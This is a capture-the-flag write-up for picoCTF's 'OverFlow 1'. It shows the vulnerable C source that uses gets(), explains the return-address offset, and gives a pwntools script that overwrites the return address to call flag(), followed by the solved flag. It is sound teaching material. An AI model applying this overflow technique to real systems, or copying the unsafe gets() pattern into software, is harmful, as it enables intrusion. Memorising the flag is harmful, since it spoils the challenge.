# OverFlow 1

## description

You beat the first overflow challenge. Now overflow the buffer and change the return address to the flag function in this [program](./vuln)? You can find it in /problems/overflow-1_4_6e02703f87bc36775cc64de920dfcf5a on the shell server. [Source](./vuln.c).

## solution

We can see that the ```vuln()``` function takes user input and stores it in a char array with a buffer size of 64.
There's also a flag() function that will print the flag if we can call it.

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include "asm.h"

#define BUFFSIZE 64
#define FLAGSIZE 64

void flag() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("Flag File is Missing. please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  printf(buf);
}

void vuln(){
  char buf[BUFFSIZE];
  gets(buf);

  printf("Woah, were jumping to 0x%x !\n", get_return_address());
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  puts("Give me a string and lets see what happens: ");
  vuln();
  return 0;
}
```

To call the flag function, we can overwrite the return address of the vulnerable function.
Consider the structure of the call stack:

```
Local variables
EBP
Arguments
Return Address
```

Because the stack grows downwards, anything we write thats longer than the space allocated for local variables will overwrite EBP then, arguments, then the return address.
In this case, we aren't concerned with arguments.

We can see that the buffer size of the char array in ```vuln()``` is 64.
Some more space is reserved for other local variables, but we can start inputting 64 bytes, followed by some recognisable pattern, such as AAAABBBBCCCCDDDD...

Given this input, the program prints 0x44444444 as the return address.
We can also check the value of EBP using GDB and see that it is 0x43434343, from here we could infer that, because there were no arguments pushed to this stack, the next characters would be the return address.

A total of 80 bytes were required to completely overwrite the return address, including 76 bytes of padding, and a new 32-bit address.
By replacing the value 0x44444444 that's currently present in our input with the address of ```flag()```, we can redirect the program to the desired function.

We can use a tool like GDB or Radare2 to print a list of functions and find the address of the flag function.
In this case, it is 0x080485e6.

## exploit script

Using what we had discovered in the steps prior, we know that we need to send the program 76 bytes, followed by the address.
I'm using pwntools as usual to connect to the process, and I'm printing the address using the ```p32()``` function, which will automatically format it in little endian.

```py
#!/usr/bin/python
from pwn import *
from getpass import getpass

pico_user = input("Username: ")[:-1]
pico_pass = getpass("Password: ")

conn = ssh(host = '2019shell1.picoctf.com', user = pico_user, password = pico_pass)

location = '/problems/overflow-1_4_6e02703f87bc36775cc64de920dfcf5a'

print("running vuln")
vuln = conn.process(location + '/vuln', cwd = location)

print("sending payload")
vuln.sendlineafter('\n', ('A' * 76).encode() + p32(0x080485e6))
vuln.recvline()

print("done")
vuln.interactive()
```

Flag: ```picoCTF{n0w_w3r3_ChaNg1ng_r3tURn5fe1ff3d8}```

